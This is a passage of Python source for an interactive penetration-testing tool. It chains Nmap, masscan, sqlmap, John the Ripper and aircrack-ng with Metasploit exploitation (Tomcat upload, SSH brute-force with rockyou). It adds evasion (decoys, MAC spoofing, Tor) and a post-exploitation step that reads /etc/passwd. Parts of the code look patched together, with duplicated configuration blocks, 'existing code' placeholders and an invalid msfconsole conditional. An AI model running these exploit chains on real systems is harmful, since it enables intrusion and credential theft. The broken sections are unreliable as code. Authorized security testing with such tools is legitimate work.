        if cve_data:
            return {
                'score': cve_data.get('base_score', 0),
                'description': cve_data.get('description', ''),
                'severity': cve_data.get('severity', 'Low'),
                'references': cve_data.get('references', []),
                'published': cve_data.get('published')
            }
        return {'score': 0, 'description': 'CVE details not available', 'severity': 'Unknown'}

    def parse_nmap_output(self, xml_file, target):
        """Parse Nmap XML output to extract CVEs, threats, and vulnerabilities"""
        try:
            tree = ET.parse(xml_file)
            root = tree.getroot()
            ports_info = []
            vulnerabilities = []

            for host in root.findall('host'):
                ip = host.find('.//address[@addrtype="ipv4"]').get('addr') if host.find('.//address[@addrtype="ipv4"]') is not None else target
                mac = host.find('.//address[@addrtype="mac"]').get('addr') if host.find('.//address[@addrtype="mac"]') is not None else 'N/A'
                os = host.find('.//osmatch').get('name') if host.find('.//osmatch') is not None else 'Unknown'
                version = host.find('.//osmatch/cpe').get('product') if host.find('.//osmatch/cpe') is not None else 'N/A'

                self.discovered_targets[ip] = {
                    'mac': mac,
                    'os': os,
                    'version': version,
                    'ports': []
                }

                for port in host.findall('.//port'):
                    state = port.find('state').get('state')
                    if state != 'open':
                        continue
                    port_id = port.get('portid')
                    service = port.find('service')
                    service_name = service.get('name') if service is not None else 'unknown'
                    service_version = service.get('version') if service is not None and service.get('version') else 'unknown'
                    ports_info.append({
                        'port': port_id,
                        'service': service_name,
                        'version': service_version
                    })
                    self.discovered_targets[ip]['ports'].append({
                        'port': port_id,
                        'service': service_name,
                        'version': service_version
                    })

                    for script in port.findall('.//script'):
                        script_id = script.get('id')
                        script_output = script.get('output')
                        if 'vuln' in script_id.lower() and script_output:
                            cve = None
                            for line in script_output.splitlines():
                                if 'CVE-' in line:
                                    cve = line.split('CVE-')[1].split(' ')[0]
                                    break
                            vuln = {
                                'port': port_id,
                                'script': script_id,
                                'output': script_output,
                                'cve': f"CVE-{cve}" if cve else None
                            }
                            if vuln['cve']:
                                vuln_details = self.fetch_cve_details(vuln['cve'])
                                vuln['score'] = vuln_details['score']
                                vuln['description'] = vuln_details['description']
                            vulnerabilities.append(vuln)

                # Store in database
                target_id = self.store_target(ip, mac, os, version, ports_info)
                for vuln in vulnerabilities:
                    self.store_vulnerability(
                        target_id,
                        vuln['port'],
                        vuln['script'],
                        vuln['output'],
                        vuln['cve'],
                        vuln.get('score', 0),
                        vuln.get('description', '')
                    )

            self.nmap_results[target] = {
                'ports': ports_info,
                'vulnerabilities': vulnerabilities
            }
            logging.info(f"Parsed Nmap results for {target}: {len(ports_info)} open ports, {len(vulnerabilities)} vulnerabilities")
            if self.verbose:
                print(f"\033[92m[+] Found {len(ports_info)} open ports and {len(vulnerabilities)} vulnerabilities on {target}\033[0m")
        except Exception as e:
            logging.error(f"Error parsing Nmap output: {str(e)}")
            if self.verbose:
                print(f"\033[91m[!] Error parsing Nmap output: {str(e)}\033[0m")

    def get_default_interface(self):
        """Attempt to detect the default network interface"""
        try:
            result = subprocess.run("ip route | grep default", shell=True, capture_output=True, text=True)
            if result.stdout:
                interface = result.stdout.split()[4]
                print(f"\033[94m[*] Detected default interface: {interface}\033[0m")
                return interface
        except Exception as e:
            logging.error(f"Failed to detect default interface: {str(e)}")
            print(f"\033[91m[!] Failed to detect default interface: {str(e)}\033[0m")
        return "eth0"  # Fallback to eth0 if detection fails

    def scan_lan(self):
        """Scan the LAN network to discover active devices using the selected network interface"""
        if not self.check_tool("nmap"):
            return

        if not self.network_interface:
            self.network_interface = self.get_default_interface()
            print(f"\033[93m[-] No network interface selected. Using default: {self.network_interface}\033[0m")

        # Get the network range (e.g., 192.168.1.0/24)
        result = subprocess.run(f"ip -4 addr show {self.network_interface} | grep inet", shell=True, capture_output=True, text=True)
        if not result.stdout:
            print(f"\033[91m[!] Could not determine network range for {self.network_interface}. Please specify a valid interface.\033[0m")
            return
        ip_info = result.stdout.split()
        ip_address = ip_info[1].split('/')[0]
        subnet = ip_info[1].split('/')[1]
        network = ipaddress.ip_network(f"{ip_address}/{subnet}", strict=False)
        network_range = str(network.network_address) + "/" + str(network.prefixlen)

        xml_output = f"lan_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.xml"
        cmd = f"nmap -sn {network_range} -oX {xml_output}"
        if self.stealth_mode:
            cmd += " -T2 --max-retries 1 --scan-delay 1s --spoof-mac 0 -D RND:5"
        if self.run_command(cmd, f"Running LAN scan on {network_range}", output_file=xml_output):
            self.parse_lan_output(xml_output)
            try:
                os.remove(xml_output)
            except Exception as e:
                logging.warning(f"Could not delete LAN XML file {xml_output}: {str(e)}")

    def parse_lan_output(self, xml_file):
        """Parse Nmap LAN scan XML output to extract device information"""
        try:
            tree = ET.parse(xml_file)
            root = tree.getroot()
            for host in root.findall('host'):
                ip = host.find('.//address[@addrtype="ipv4"]').get('addr') if host.find('.//address[@addrtype="ipv4"]') is not None else 'Unknown'
                mac = host.find('.//address[@addrtype="mac"]').get('addr') if host.find('.//address[@addrtype="mac"]') is not None else 'N/A'
                os = host.find('.//osmatch').get('name') if host.find('.//osmatch') is not None else 'Unknown'
                version = host.find('.//osmatch/cpe').get('product') if host.find('.//osmatch/cpe') is not None else 'N/A'
                ports = []
                for port in host.findall('.//port'):
                    if port.find('state').get('state') == 'open':
                        port_id = port.get('portid')
                        service = port.find('service').get('name') if port.find('service') is not None else 'unknown'
                        service_version = port.find('service').get('version') if port.find('service') is not None and port.find('service').get('version') else 'unknown'
                        ports.append({'port': port_id, 'service': service, 'version': service_version})

                self.discovered_targets[ip] = {
                    'mac': mac,
                    'os': os,
                    'version': version,
                    'ports': ports
                }

                # Store in database
                self.store_target(ip, mac, os, version, ports)

            logging.info(f"Discovered {len(self.discovered_targets)} devices on LAN")
            if self.verbose:
                print(f"\033[92m[+] Discovered {len(self.discovered_targets)} devices on LAN\033[0m")
        except Exception as e:
            logging.error(f"Error parsing LAN scan output: {str(e)}")
            if self.verbose:
                print(f"\033[91m[!] Error parsing LAN scan output: {str(e)}\033[0m")

    def display_targets(self):
        """Display discovered targets in a formatted table"""
        if not self.discovered_targets:
            print("\033[93m[-] No targets discovered. Please run a LAN scan first.\033[0m")
            return
        print("\n\033[94m=== Discovered Targets ===\033[0m")
        print("IP Address\tMAC Address\tPlatform\tVersion\t\tOpen Ports")
        print("-" * 80)
        for ip, details in self.discovered_targets.items():
            ports = ", ".join([f"{p['port']}/{p['service']}" for p in details.get('ports', [])])
            print(f"{ip}\t\t{details['mac']}\t\t{details['os']}\t\t{details['version']}\t\t{ports}")
        print("-" * 80)

    def select_targets(self):
        """Interactively select targets with LAN scan option"""
        print("\n\033[94m=== Target Selection ===\033[0m")
        method = self.session.prompt(
            HTML('<prompt>Choose target selection method (single/file/lan): </prompt>'),
            completer=WordCompleter(['single', 'file', 'lan'], ignore_case=True)
        ).lower()
        
        if method == 'single':
            target = self.session.prompt(HTML('<prompt>Enter target IP (default: 127.0.0.1): </prompt>'))
            self.targets = [target or "127.0.0.1"]
        elif method == 'file':
            file_path = self.session.prompt(HTML('<prompt>Enter path to targets file: </prompt>'))
            if os.path.exists(file_path):
                with open(file_path, "r") as f:
                    self.targets = [line.strip() for line in f if line.strip()]
            else:
                print(f"\033[91m[!] File {file_path} not found. Using default target (127.0.0.1).\033[0m")
                self.targets = ["127.0.0.1"]
        elif method == 'lan':
            self.scan_lan()
            self.display_targets()
            if self.discovered_targets:
                selected_ips = self.session.prompt(
                    HTML('<prompt>Enter IP(s) to select (comma-separated, e.g., 192.168.1.1,192.168.1.2, or press Enter for all): </prompt>')
                )
                if selected_ips:
                    self.targets = [ip.strip() for ip in selected_ips.split(',') if ip.strip() in self.discovered_targets]
                else:
                    self.targets = list(self.discovered_targets.keys())
            else:
                print("\033[93m[-] No targets found. Using default target (127.0.0.1).\033[0m")
                self.targets = ["127.0.0.1"]
        else:
            print("\033[93m[-] Invalid method. Using default target (127.0.0.1).\033[0m")
            self.targets = ["127.0.0.1"]
        
        print(f"\033[92m[+] Selected targets: {', '.join(self.targets)}\033[0m")

    def run_nmap(self, target):
        """Run Nmap scan with enhanced stealth options"""
        if not self.check_tool("nmap"):
            return
            
        # Use plugin system if enabled
        if self.use_plugin_system:
            options = {
                'port_range': self.port_range,
                'stealth_mode': self.stealth_mode,
                'use_tor': self.use_tor,
                'verbose': self.verbose
            }
            
            scanner = NmapScanner(options)
            results = scanner.scan(target)
            
            # Store results for compatibility
            self.results[target]["Nmap Scan"] = results
            self.nmap_results[target] = {
                'ports': results.get('ports', []),
                'vulnerabilities': results.get('vulnerabilities', [])
            }
            
            # Process vulnerabilities
            # ... process vulnerabilities ...
            
            return True
        
        # Original implementation
        xml_output = f"nmap_output_{target.replace('.', '_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.xml"
        cmd = f"nmap -p {self.port_range} -sV --script vuln {target}"
        if self.stealth_mode:
            cmd += " -T2 --max-retries 1 --scan-delay 1s --spoof-mac 0"
        if self.run_command(cmd, f"Running Nmap scan on {target}", target, output_file=xml_output):
            self.parse_nmap_output(xml_output, target)
            try:
                os.remove(xml_output)
            except Exception as e:
                logging.warning(f"Could not delete Nmap XML file {xml_output}: {str(e)}")

    def run_metasploit_vuln_scan(self, target):
        """Run Metasploit to scan for vulnerabilities and CVEs"""
        if not self.check_tool("msfconsole"):
            return

        msf_commands = []
        ports_info = self.nmap_results[target]['ports']

        for port_info in ports_info:
            port = port_info['port']
            service = port_info['service'].lower()

            if service == 'ssh':
                msf_commands.append(f"use auxiliary/scanner/ssh/ssh_enumusers; set RHOSTS {target}; set RPORT {port}; run;")
            elif service in ['http', 'https']:
                msf_commands.append(f"use auxiliary/scanner/http/tomcat_mgr_login; set RHOSTS {target}; set RPORT {port}; run;")
                msf_commands.append(f"use auxiliary/scanner/http/http_put; set RHOSTS {target}; set RPORT {port}; run;")

        msf_command = "msfconsole -x '" + " ".join(msf_commands) + " exit'"
        self.run_command(msf_command, f"Running Metasploit vulnerability scan on {target}", target)

    def run_metasploit(self):
        """Run Metasploit to perform auxiliary tests and exploitation based on Nmap results"""
        if not self.check_tool("msfconsole"):
            return

        target = self.targets[0]
        if target not in self.nmap_results or not self.nmap_results[target]['ports']:
            print(f"\033[93m[-] No Nmap results available for {target}. Skipping Metasploit.\033[0m")
            return

        self.run_metasploit_vuln_scan(target)

        msf_commands = []
        ports_info = self.nmap_results[target]['ports']
        vulnerabilities = self.nmap_results[target]['vulnerabilities']

        for port_info in ports_info:
            port = port_info['port']
            service = port_info['service'].lower()
            version = port_info['version']

            if service == 'ssh':
                msf_commands.append(f"use auxiliary/scanner/ssh/ssh_version; set RHOSTS {target}; set RPORT {port}; run;")
            elif service in ['http', 'https']:
                msf_commands.append(f"use auxiliary/scanner/http/http_version; set RHOSTS {target}; set RPORT {port}; run;")

        if vulnerabilities:
            print(f"\033[94m[*] Detected {len(vulnerabilities)} vulnerabilities on {target}:\033[0m")
            for vuln in vulnerabilities:
                print(f"  - Port {vuln['port']}: {vuln['script']} - {vuln['output']}")
                if vuln['cve']:
                    print(f"    CVE: {vuln['cve']} (Score: {vuln['score']})")
            proceed = self.session.prompt(
                HTML('<prompt>Proceed with exploitation? (yes/no): </prompt>'),
                completer=WordCompleter(['yes', 'no'], ignore_case=True)
            ).lower()
            if proceed == 'yes':
                username = self.session.prompt(HTML('<prompt>Enter username for exploitation (default: admin): </prompt>')) or "admin"
                password = self.session.prompt(HTML('<prompt>Enter password for exploitation (default: password): </prompt>')) or "password"
                wordlist = self.session.prompt(HTML('<prompt>Enter path to wordlist (or press Enter for default /usr/share/wordlists/rockyou.txt): </prompt>')) or "/usr/share/wordlists/rockyou.txt"
                if not os.path.exists(wordlist):
                    print(f"\033[91m[!] Wordlist {wordlist} not found. Using default /usr/share/wordlists/rockyou.txt.\033[0m")
                    wordlist = "/usr/share/wordlists/rockyou.txt"

                for vuln in vulnerabilities:
                    script_id = vuln['script']
                    port = vuln['port']
                    output = vuln['output'].lower()

                    if 'ssh' in script_id.lower() and 'vulnerable' in output:
                        msf_commands.append(f"use exploit/multi/ssh/sshexec; set RHOSTS {target}; set RPORT {port}; set USERNAME {username}; set PASSWORD {password}; run;")
                        msf_commands.append(f"set PASS_FILE {wordlist}; run;")
                        if self.verbose:
                            print(f"\033[92m[+] Attempting SSH exploitation on {target}:{port} with wordlist {wordlist}\033[0m")

                    if 'http' in script_id.lower() and 'vulnerable' in output:
                        msf_commands.append(f"use exploit/multi/http/tomcat_mgr_upload; set RHOSTS {target}; set RPORT {port}; run;")
                        if self.verbose:
                            print(f"\033[92m[+] Attempting HTTP exploitation on {target}:{port}\033[0m")

                    msf_commands.append(f"if session_created?; then sysinfo; sessions -i; pwd; cat /etc/passwd; exit; end;")

        if not msf_commands:
            msf_commands.append(f"use auxiliary/scanner/portscan/tcp; set RHOSTS {target}; set PORTS {self.port_range}; run;")

        msf_command = "msfconsole -x '" + " ".join(msf_commands) + " exit'"
        self.run_command(msf_command, "Running Metasploit auxiliary tests and exploitation", target)

    def gather_system_info(self, target):
        """Gather basic system information"""
        tasks = [
            (target, "whoami", "Checking current user"),
            (target, "hostname", "Checking hostname"),
            (target, "uname -a", "Checking kernel and system info"),
            (target, "ufw status", "Checking firewall status"),
            (target, "ps aux", "Listing running processes"),
            (target, "ss -tuln", "Listing listening ports"),
        ]
        self.run_parallel_tasks(tasks)

    def run_masscan(self, target):
        """Run Masscan with stealth options"""
        if not self.check_tool("masscan"):
            return
        cmd = f"masscan {target} -p {self.port_range} --rate {random.uniform(100, 500)}"
        if self.stealth_mode:
            cmd += " --wait 2 --randomize-hosts"
        self.run_command(cmd, f"Running Masscan on {target} (ports {self.port_range})", target)

    def run_netcat(self, target):
        """Run Netcat scan with stealth"""
        if not self.check_tool("nc"):
            return
        cmd = f"nc -z -nv {target} {self.port_range}"
        if self.stealth_mode:
            cmd += f" -w {random.uniform(1, 3)}"
        self.run_command(cmd, f"Running Netcat scan on {target} (ports {self.port_range})", target)

    def run_nikto(self, target):
        """Run Nikto for web vulnerability scanning with stealth"""
        if not self.check_tool("nikto"):
            return
        cmd = f"nikto -h {target}"
        if self.stealth_mode:
            cmd += " -Tuning 8"
        self.run_command(cmd, f"Running Nikto on {target}", target)

    def run_sqlmap(self, target):
        """Run SQLmap for SQL injection testing with stealth"""
        if not self.check_tool("sqlmap"):
            return
        cmd = f"sqlmap -u http://{target} --batch"
        if self.stealth_mode:
            cmd += f" --delay {random.uniform(0.5, 2)} --safe-url http://example.com --safe-freq {random.randint(2, 5)}"
        self.run_command(cmd, f"Running SQLmap on {target}", target)

    def run_john(self):
        """Run John the Ripper for password cracking with custom wordlist"""
        if not self.check_tool("john"):
            return
        hash_file = self.session.prompt(HTML('<prompt>Enter path to hash file (or press Enter to skip): </prompt>'))
        if not hash_file:
            print("\033[93m[-] Skipping John the Ripper test.\033[0m")
            return
        if not os.path.exists(hash_file):
            print(f"\033[91m[!] Hash file {hash_file} not found.\033[0m")
            return
        wordlist = self.session.prompt(HTML('<prompt>Enter path to wordlist (or press Enter for default /usr/share/wordlists/rockyou.txt): </prompt>')) or "/usr/share/wordlists/rockyou.txt"
        if not os.path.exists(wordlist):
            print(f"\033[91m[!] Wordlist {wordlist} not found. Using default /usr/share/wordlists/rockyou.txt.\033[0m")
            wordlist = "/usr/share/wordlists/rockyou.txt"
        cmd = f"john --wordlist={wordlist} {hash_file}"
        self.run_command(cmd, "Running John the Ripper password cracking with custom wordlist", self.targets[0])

    def run_aircrack_ng(self):
        """Run Aircrack-ng for wireless testing using the selected network interface"""
        if not self.check_tool("aircrack-ng"):
            return

        if not self.network_interface:
            self.network_interface = self.get_default_interface()
            print(f"\033[93m[-] No network interface selected. Using default: {self.network_interface}\033[0m")

        cmd = f"airmon-ng start {self.network_interface} && airodump-ng {self.network_interface}mon"
        self.run_command(cmd, f"Running Aircrack-ng on {self.network_interface}", self.targets[0])

    def check_anonsurf(self):
        """Check AnonSurf and Tor status"""
        if not self.check_tool("anonsurf"):
            return
        tasks = [
            (self.targets[0], "anonsurf status", "Checking AnonSurf status"),
            (self.targets[0], "anonsurf myip", "Checking IP via AnonSurf"),
            (self.targets[0], "curl --socks5 localhost:9050 https://check.torproject.org/api/ip", "Checking Tor IP")
        ]
        self.run_parallel_tasks(tasks)

    def run_lynis(self):
        """Run Lynis for system auditing"""
        if not self.check_tool("lynis"):
            return
        cmd = "lynis audit system"
        self.run_command(cmd, "Running Lynis system audit", self.targets[0])

    def run_chkrootkit(self):
        """Run chkrootkit for rootkit detection"""
        if not self.check_tool("chkrootkit"):
            return
        cmd = "chkrootkit"
        self.run_command(cmd, "Running chkrootkit", self.targets[0])

    def save_report(self, formats=None):
        """Save results to specified formats with enhanced database integration"""
        if not formats:
            formats = ['text', 'html', 'csv']

        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        report_file = f"interactive_test_report_{timestamp}.txt"
        html_report_file = f"interactive_test_report_{timestamp}.html"
        csv_report_file = f"interactive_test_report_{timestamp}.csv"

        # Fetch data from database
        self.cursor.execute("SELECT * FROM targets")
        targets = self.cursor.fetchall()

        # Fetch ports for each target
        target_ports = {}
        for target in targets:
            target_id = target[0]
            self.cursor.execute("SELECT port, service, version FROM ports WHERE target_id = ?", (target_id,))
            ports = [{'port': row[0], 'service': row[1], 'version': row[2]} for row in self.cursor.fetchall()]
            target_with_ports = list(target) + [ports]
            target_ports[target_id] = target_with_ports

        self.cursor.execute('''
            SELECT t.ip, tr.test_name, tr.result, tr.timestamp
            FROM test_results tr
            JOIN targets t ON tr.target_id = t.id
        ''')
        test_results = self.cursor.fetchall()

        self.cursor.execute('''
            SELECT t.ip, v.port, v.script, v.output, v.cve, v.score, v.description, v.timestamp
            FROM vulnerabilities v
            JOIN targets t ON v.target_id = t.id
        ''')
        vulnerabilities = self.cursor.fetchall()

        saved_files = []
        try:
            if 'text' in formats:
                with open(report_file, "w") as f:
                    f.write(f"Interactive System Test Report - {datetime.now().isoformat()}\n")
                    f.write("=" * 50 + "\n\n")
                    if targets:
                        f.write("Discovered Targets:\n")
                        f.write("IP Address\tMAC Address\tPlatform\tVersion\t\tOpen Ports\tScan Timestamp\n")
                        f.write("-" * 80 + "\n")
                        for target in targets:
                            target_id = target[0]
                            ports = target_ports.get(target_id, [[]])[-1]
                            ports_str = ", ".join([f"{p['port']}/{p['service']}" for p in ports])
                            f.write(f"{target[1]}\t\t{target[2] or 'N/A'}\t\t{target[3] or 'Unknown'}\t\t{target[4] or 'N/A'}\t\t{ports_str}\t{target[5]}\n")
                        f.write("-" * 80 + "\n\n")
                    for target, result in self.results.items():
                        f.write(f"Target: {target}\n")
                        for test, output in result.items():
                            f.write(f"{test}\n{output}\n")
                logging.info(f"Text report saved to {report_file}")
                saved_files.append(report_file)

            if 'html' in formats:
                template = env.get_template("report.html")
                html_content = template.render(
                    timestamp=datetime.now().isoformat(),
                    results=self.results,
                    targets=list(target_ports.values()),
                    test_results=test_results,
                    vulnerabilities=vulnerabilities
                )
                with open(html_report_file, "w") as f:
                    f.write(html_content)
                logging.info(f"HTML report saved to {html_report_file}")
                saved_files.append(html_report_file)

            if 'csv' in formats:
                with open(csv_report_file, "w", newline="") as f:
                    writer = csv.writer(f)
                    writer.writerow(["Target", "Test", "Result"])
                    if targets:
                        writer.writerow(["Discovered Targets"])
                        writer.writerow(["IP Address", "MAC Address", "Platform", "Version", "Open Ports", "Scan Timestamp"])
                        for target in targets:
                            target_id = target[0]
                            ports = target_ports.get(target_id, [[]])[-1]
                            ports_str = ", ".join([f"{p['port']}/{p['service']}" for p in ports])
                            writer.writerow([target[1], target[2] or 'N/A', target[3] or 'Unknown', target[4] or 'N/A', ports_str, target[5]])
                    for target, result in self.results.items():
                        for test, output in result.items():
                            writer.writerow([target, test, output.replace("\n", " ")])
                logging.info(f"CSV report saved to {csv_report_file}")
                saved_files.append(csv_report_file)

            self.last_report_files = {
                'text': report_file if 'text' in formats else None,
                'html': html_report_file if 'html' in formats else None,
                'csv': csv_report_file if 'csv' in formats else None
            }

            print(f"\033[92m[+] Reports saved: {', '.join(saved_files)}\033[0m")
        except Exception as e:
            logging.error(f"Error saving report: {str(e)}")
            print(f"\033[91m[!] Error saving report: {str(e)}\033[0m")
            
        # Add ML predictions and risk assessments to reports
        if self.ml_predictions or self.ml_risk_assessments:
            ml_report_file = f"ml_predictions_{timestamp}.json"
            try:
                # Prepare data for serialization
                ml_data = {
                    "predictions": {},
                    "risk_assessments": {}
                }
                
                # Process predictions
                for target, preds in self.ml_predictions.items():
                    ml_data["predictions"][target] = []
                    for pred in preds:
                        # Clean up prediction data for JSON serialization
                        clean_pred = {
                            "service_name": pred["service"].get("name", "unknown"),
                            "service_port": pred["service"].get("port", 0),
                            "service_version": pred["service"].get("version", ""),
                            "probability": pred["probability"],
                            "prediction": pred["prediction"],
                            "potential_cves": []
                        }
                        
                        # Add potential CVEs if available
                        if "potential_cves" in pred:
                            for cve in pred["potential_cves"]:
                                clean_pred["potential_cves"].append({
                                    "id": cve.get("id", ""),
                                    "summary": cve.get("summary", ""),
                                    "published": cve.get("published", "")
                                })
                        
                        ml_data["predictions"][target].append(clean_pred)
                
                # Process risk assessments
                for target, assess in self.ml_risk_assessments.items():
                    if isinstance(assess, dict) and "error" not in assess:
                        ml_data["risk_assessments"][target] = {
                            "risk_score": assess.get("risk_score", 0),
                            "risk_level": assess.get("risk_level", "Unknown"),
                            "recommendations": assess.get("recommendations", []),
                            "high_risk_services": [{
                                "name": s.get("name", ""),
                                "port": s.get("port", 0),
                                "risk_score": s.get("risk_score", 0)
                            } for s in assess.get("high_risk_services", [])]
                        }
                
                # Save to file
                with open(ml_report_file, "w") as f:
                    json.dump(ml_data, f, indent=2)
                
                print(f"\033[92m[+] ML prediction report saved to {ml_report_file}\033[0m")
                
            except Exception as e:
                self.logger.error(f"Error saving ML report: {str(e)}")
                print(f"\033[91m[!] Error saving ML report: {str(e)}\033[0m")

    def export_reports(self):
        """Interactively export reports in selected formats"""
        if not self.results and not self.discovered_targets:
            print("\033[93m[-] No test results or discovered targets available to export. Please run a test or LAN scan first.\033[0m")
            return

        print("\n\033[94m=== Export Reports ===\033[0m")
        formats_input = self.session.prompt(
            HTML('<prompt>Select export formats (text, html, enhanced_html, csv, comma-separated, e.g., text,csv): </prompt>'),
            completer=WordCompleter(['text', 'html', 'enhanced_html', 'csv'], ignore_case=True)
        ).lower()

        if not formats_input:
            print("\033[93m[-] No formats selected. Export cancelled.\033[0m")
            return

        selected_formats = [fmt.strip() for fmt in formats_input.split(',')]
        valid_formats = ['text', 'html', 'enhanced_html', 'csv']
        formats_to_export = [fmt for fmt in selected_formats if fmt in valid_formats]

        if not formats_to_export:
            print("\033[93m[-] Invalid formats selected. Use: text, html, enhanced_html, csv.\033[0m")
            return

        # Handle enhanced_html separately
        if 'enhanced_html' in formats_to_export:
            formats_to_export.remove('enhanced_html')
            self.generate_enhanced_report()
            
        # Handle standard formats
        if formats_to_export:
            self.save_report(formats=formats_to_export)

    def generate_enhanced_report(self):
        """Generate enhanced HTML report with interactive elements"""
        # Add ML predictions to report data if available
        if self.use_ml_predictions and (self.ml_predictions or self.ml_risk_assessments):
            enhanced_report = EnhancedHTMLReport(self.conn, ml_data={
                'predictions': self.ml_predictions,
                'risk_assessments': self.ml_risk_assessments
            })
        else:
            enhanced_report = EnhancedHTMLReport(self.conn)
            
        report_file = enhanced_report.generate_report()
        self.last_report_files['enhanced_html'] = report_file
        return report_file

    def configure_settings(self):
        """Interactively configure test settings with network interface selection"""
        print("\n\033[94m=== Test Configuration ===\033[0m")
        self.port_range = self.session.prompt(
            HTML('<prompt>Enter port range (default: 1-1024): </prompt>')
        ) or "1-1024"
        
        self.profile = self.session.prompt(
            HTML('<prompt>Choose test profile (all/network/vulnerability/exploitation/anonymity/auditing/wireless): </prompt>'),
            completer=WordCompleter(['all', 'network', 'vulnerability', 'exploitation', 'anonymity', 'auditing', 'wireless'], ignore_case=True)
        ).lower() or "all"
        
        verbose_input = self.session.prompt(
            HTML('<prompt>Enable verbose mode? (yes/no): </prompt>'),
            completer=WordCompleter(['yes', 'no'], ignore_case=True)
        ).lower()
        self.verbose = verbose_input == "yes"

        stealth_input = self.session.prompt(
            HTML('<prompt>Enable stealth mode? (yes/no): </prompt>'),
            completer=WordCompleter(['yes', 'no'], ignore_case=True)
        ).lower()
        self.stealth_mode = stealth_input == "yes"

        tor_input = self.session.prompt(
            HTML('<prompt>Use Tor for anonymity? (yes/no): </prompt>'),
            completer=WordCompleter(['yes', 'no'], ignore_case=True)
        ).lower()
        self.use_tor = tor_input == "yes"

        # Network interface selection
        interfaces = self.get_available_interfaces()
        interface_list = ', '.join(interfaces) if interfaces else "None detected"
        
        print(f"\033[94m[*] Available network interfaces: {interface_list}\033[0m")
        
        self.network_interface = self.session.prompt(
            HTML('<prompt>Enter network interface for testing (e.g., eth0, wlan0, or press Enter to detect): </prompt>'),
            completer=WordCompleter(interfaces, ignore_case=True)
        )
        
        if not self.network_interface:
            self.network_interface = self.get_default_interface()
            print(f"\033[94m[*] Using default interface: {self.network_interface}\033[0m")
        
        # Post-exploitation configuration
        if self.session.prompt(
            HTML('<prompt>Configure post-exploitation? (yes/no): </prompt>'),
            completer=WordCompleter(['yes', 'no'], ignore_case=True)
        ).lower() == "yes":
            token_input = self.session.prompt(
                HTML('<prompt>Enter authorization token (required for post-exploitation): </prompt>')
            )
            if token_input:
                self.authorized_token = token_input
                self.post_exploit = PostExploitationModule(
                    config_file="post_exploitation_config.json",
                    authorization_token=self.authorized_token
                )
                print("\033[92m[+] Post-exploitation module authorized\033[0m")
            else:
                print("\033[93m[-] No token provided. Post-exploitation disabled.\033[0m")

        if self.use_tor:
            self.setup_anonymity()
        if self.stealth_mode:
            self.spoof_mac()
        
        print(f"\033[92m[+] Configured: Port Range={self.port_range}, Profile={self.profile}, Verbose={self.verbose}, Stealth={self.stealth_mode}, Tor={self.use_tor}, Interface={self.network_interface}\033[0m")

        # Special configuration for wireless testing
        if self.profile in ["all", "wireless"]:
            wireless_interfaces = self.get_wireless_interfaces()
            if wireless_interfaces:
                wireless_list = ', '.join(wireless_interfaces)
                print(f"\033[94m[*] Available wireless interfaces: {wireless_list}\033[0m")
                wireless_interface = self.session.prompt(
                    HTML('<prompt>Enter wireless interface for testing (or press Enter to use selected interface): </prompt>'),
                    completer=WordCompleter(wireless_interfaces, ignore_case=True)
                )
                if wireless_interface:
                    self.network_interface = wireless_interface
                    print(f"\033[94m[*] Using wireless interface: {self.network_interface}\033[0m")
            else:
                print("\033[93m[-] No wireless interfaces detected. Wireless testing may not work.\033[0m")

        if self.use_tor:
            self.setup_anonymity()
        if self.stealth_mode:
            self.spoof_mac()
        
        print(f"\033[92m[+] Configured: Port Range={self.port_range}, Profile={self.profile}, Verbose={self.verbose}, Stealth={self.stealth_mode}, Tor={self.use_tor}, Interface={self.network_interface}\033[0m")
        
        plugin_input = self.session.prompt(
            HTML('<prompt>Use enhanced plugin system? (yes/no): </prompt>'),
            completer=WordCompleter(['yes', 'no'], ignore_case=True)
        ).lower()
        self.use_plugin_system = plugin_input == "yes"
        
        print(f"\033[92m[+] Plugin system: {'Enabled' if self.use_plugin_system else 'Disabled'}\033[0m")

        # Show available scan profiles
        print("\033[94m[*] Available scan profiles:\033[0m")
        profile_ids = self.profile_manager.get_available_profiles()
        for idx, profile_id in enumerate(profile_ids):
            profile = self.profile_manager.get_profile(profile_id)
            if profile:
                print(f"  {idx+1}. {profile['name']} - {profile['description']}")
        
        # Ask to use a predefined profile
        use_profile = self.session.prompt(
            HTML('<prompt>Use a predefined scan profile? (yes/no): </prompt>'),
            completer=WordCompleter(['yes', 'no'], ignore_case=True)
        ).lower()
        
        if use_profile == "yes":
            profile_choice = self.session.prompt(
                HTML('<prompt>Enter profile number or name: </prompt>')
            )
            
            # Try to find profile by index or name
            selected_profile = None
            try:
                # Try as index
                idx = int(profile_choice) - 1
                if 0 <= idx < len(profile_ids):
                    selected_profile = self.profile_manager.get_profile(profile_ids[idx])
                    self.selected_profile_id = profile_ids[idx]
            except ValueError:
                # Try as profile_id
                if profile_choice in profile_ids:
                    selected_profile = self.profile_manager.get_profile(profile_choice)
                    self.selected_profile_id = profile_choice
                else:
                    # Try case-insensitive match
                    for profile_id in profile_ids:
                        if profile_id.lower() == profile_choice.lower():
                            selected_profile = self.profile_manager.get_profile(profile_id)
                            self.selected_profile_id = profile_id
                            break
            
            if selected_profile:
                # Apply profile settings
                self.port_range = selected_profile.get("port_range", self.port_range)
                self.profile = selected_profile.get("profile", self.profile)
                self.stealth_mode = selected_profile.get("stealth_mode", self.stealth_mode)
                self.max_concurrent = selected_profile.get("max_concurrent", 10)
                print(f"\033[92m[+] Applied profile: {selected_profile['name']}\033[0m")
            else:
                print("\033[91m[!] Profile not found. Using manual configuration.\033[0m")
                self.selected_profile_id = None
        else:
            self.selected_profile_id = None
        
        # Allow manual configuration/override of profile settings
        self.port_range = self.session.prompt(
            HTML(f'<prompt>Enter port range (default: {self.port_range}): </prompt>')
        ) or self.port_range
        
        # ...existing code for other configuration settings...

        # Ask about workflow system
        workflow_input = self.session.prompt(
            HTML('<prompt>Use workflow system for coordinated scanning? (yes/no): </prompt>'),
            completer=WordCompleter(['yes', 'no'], ignore_case=True)
        ).lower()
        self.use_workflow_system = workflow_input != "no"
        
        print(f"\033[92m[+] Workflow system: {'Enabled' if self.use_workflow_system else 'Disabled'}\033[0m")
        
        # Ask about real-time updates
        realtime_input = self.session.prompt(
            HTML('<prompt>Enable real-time scan updates? (yes/no): </prompt>'),
            completer=WordCompleter(['yes', 'no'], ignore_case=True)
        ).lower()
        self.use_realtime_updates = realtime_input != "no"
        
        print(f"\033[92m[+] Real-time updates: {'Enabled' if self.use_realtime_updates else 'Disabled'}\033[0m")
        
